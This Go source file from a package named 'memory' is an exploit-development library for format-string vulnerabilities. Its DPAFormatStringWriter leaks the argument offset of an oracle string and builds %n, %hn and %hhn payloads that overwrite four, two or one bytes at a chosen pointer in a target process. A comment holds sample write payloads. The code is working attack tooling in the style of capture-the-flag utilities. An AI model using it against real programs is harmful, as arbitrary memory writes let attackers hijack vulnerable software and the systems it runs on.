package memory

import (
	"bytes"
	"fmt"
)

// DPAFormatStringWriterConfig configures a DPAFormatStringWriter.
//
// TODO: Document the format string structure below:
// %192p%9$n%16197p%10$n
// %192p|%9$n|
type DPAFormatStringWriterConfig struct {
	// MaxWrite is the maximum number that will be written to memory.
	//
	// This is used to structure the format string such that it remains
	// aligned with the amount of memory that the format string function
	// reads per format specifier. This guarantees that the string
	// consistently writes data to the specified pointer.
	MaxWrite int

	// DPAConfig is the DPAFormatStringConfig that will be used to
	// build the format string.
	DPAConfig DPAFormatStringConfig
}

// NewDPAFormatStringWriterOrExit calls NewDPAFormatStringWriter, subsequently
// callings DefaultExitFn if an error occurs.
func NewDPAFormatStringWriterOrExit(config DPAFormatStringWriterConfig) *DPAFormatStringWriter {
	w, err := NewDPAFormatStringWriter(config)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to create new dpa format string writer - %w", err))
	}
	return w
}

// NewDPAFormatStringWriter creates a new instance of a *DPAFormatStringWriter.
// In order to do this, it first leaks the direct access parameter argument
// number of an oracle string. The oracle is subsequently replaced with
// a memory address that the user would like to write to.
func NewDPAFormatStringWriter(config DPAFormatStringWriterConfig) (*DPAFormatStringWriter, error) {
	if config.MaxWrite <= 0 {
		return nil, fmt.Errorf("maximum write size cannot be less than or equal to zero")
	}

	leakConfig, err := createDPAFormatStringLeakWithLastValueAsArg(dpaLeakSetupConfig{
		dpaConfig: config.DPAConfig,
		builderAndMemAlignedLenFn: func() (formatStringBuilder, int) {
			fmtStrBuilder := formatStringBuilder{
				returnDataDelim:  []byte("|"),
				endOfStringDelim: []byte("foozlefu"),
			}
			buff := bytes.NewBuffer(nil)
			fmtStrBuilder.appendDPAWrite(
				config.MaxWrite,
				config.DPAConfig.MaxNumParams,
				[]byte("aaa"), // This could potentially be 'hhn'.
				buff)
			return fmtStrBuilder, stringLenMemoryAligned(buff.Bytes(), config.DPAConfig.PointerSize)
		},
	})
	if err != nil {
		return nil, err
	}

	return &DPAFormatStringWriter{
		config:     config,
		leakConfig: leakConfig,
	}, nil
}

// DPAFormatStringWriter abstracts writing data to a pointer in memory
// using a format string.
//
// Writing memory is accomplished by forcing the format function to write
// new characters to a string, and then writing the number of characters
// created by the function to the specified memory address.
type DPAFormatStringWriter struct {
	// config is the DPAFormatStringWriterConfig used to create
	// this writer.
	config DPAFormatStringWriterConfig

	// leakConfig is the *dpaLeakConfig used to generate the
	// original format string.
	leakConfig *dpaLeakConfig
}

// WriteLower4BytesAtOrExit calls WriteLower4BytesAt, subsequently calling
// DefaultExitFn if an error occurs.
func (o DPAFormatStringWriter) WriteLower4BytesAtOrExit(newLowerBytes int, pointer Pointer) {
	err := o.WriteLower4BytesAt(newLowerBytes, pointer)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
			newLowerBytes, pointer.HexString(), err))
	}
}

// WriteLower4BytesAt attempts to overwrite the lower four bytes with a number
// at the specified pointer.
func (o DPAFormatStringWriter) WriteLower4BytesAt(newLowerBytes int, pointer Pointer) error {
	str, err := o.Lower4BytesFormatString(newLowerBytes)
	if err != nil {
		return err
	}

	_, err = leakDataWithFormatString(
		o.config.DPAConfig.ProcessIOFn(),
		append(str, pointer.Bytes()...),
		o.leakConfig.builder)
	return err
}

// TODO: Pass Pointer to this?
func (o DPAFormatStringWriter) Lower4BytesFormatString(newLowerBytes int) ([]byte, error) {
	adjustedNum, err := o.adjustNumToWrite(newLowerBytes)
	if err != nil {
		return nil, err
	}

	buff := bytes.NewBuffer(nil)
	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'n'}, buff)
	return o.leakConfig.builder.build(o.leakConfig.alignLen, buff), nil
}

// WriteLower2BytesAtOrExit calls WriteLower2BytesAt, subsequently calling
// DefaultExitFn if an error occurs.
func (o DPAFormatStringWriter) WriteLower2BytesAtOrExit(newLowerBytes int, pointer Pointer) {
	err := o.WriteLower2BytesAt(newLowerBytes, pointer)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
			newLowerBytes, pointer.HexString(), err))
	}
}

// WriteLower2BytesAt attempts to overwrite the lower two bytes with a number
// at the specified pointer.
func (o DPAFormatStringWriter) WriteLower2BytesAt(newLowerBytes int, pointer Pointer) error {
	str, err := o.Lower2BytesFormatString(newLowerBytes)
	if err != nil {
		return err
	}

	_, err = leakDataWithFormatString(
		o.config.DPAConfig.ProcessIOFn(),
		append(str, pointer.Bytes()...),
		o.leakConfig.builder)
	return err
}

// Lower2BytesFormatString creates a new format string that can be used to
// overwrite the lower two bytes.
// TODO: Pass Pointer to this?
func (o DPAFormatStringWriter) Lower2BytesFormatString(newLowerBytes int) ([]byte, error) {
	adjustedNum, err := o.adjustNumToWrite(newLowerBytes)
	if err != nil {
		return nil, err
	}

	buff := bytes.NewBuffer(nil)
	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'h', 'n'}, buff)
	return o.leakConfig.builder.build(o.leakConfig.alignLen, buff), nil
}

// WriteLowestByteAtOrExit calls WriteLowestByteAt, subsequently calling
// DefaultExitFn if an error occurs.
func (o DPAFormatStringWriter) WriteLowestByteAtOrExit(newLowerByte int, pointer Pointer) {
	err := o.WriteLowestByteAt(newLowerByte, pointer)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
			newLowerByte, pointer.HexString(), err))
	}
}

// WriteLowestByteAt attempts to overwrite the lowest byte with a number
// at the specified pointer.
func (o DPAFormatStringWriter) WriteLowestByteAt(newLowerByte int, pointer Pointer) error {
	str, err := o.LowestByteFormatString(newLowerByte)
	if err != nil {
		return err
	}

	_, err = leakDataWithFormatString(
		o.config.DPAConfig.ProcessIOFn(),
		append(str, pointer.Bytes()...),
		o.leakConfig.builder)
	return err
}

// TODO: Pass Pointer to this?
func (o DPAFormatStringWriter) LowestByteFormatString(newLowerByte int) ([]byte, error) {
	adjustedNum, err := o.adjustNumToWrite(newLowerByte)
	if err != nil {
		return nil, err
	}

	buff := bytes.NewBuffer(nil)
	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'h', 'h', 'n'}, buff)
	return o.leakConfig.builder.build(o.leakConfig.alignLen, buff), nil
}

func (o DPAFormatStringWriter) adjustNumToWrite(newValue int) (int, error) {
	if newValue <= 0 {
		return 0, fmt.Errorf("the specified write size of %d cannot be less than or equal to 0", newValue)
	}

	if newValue > o.config.MaxWrite {
		return 0, fmt.Errorf("the specified write size of %d cannot be greater than the configured max of %d",
			newValue, o.config.MaxWrite)
	}

	return newValue-len(o.leakConfig.builder.returnDataDelim), nil
}
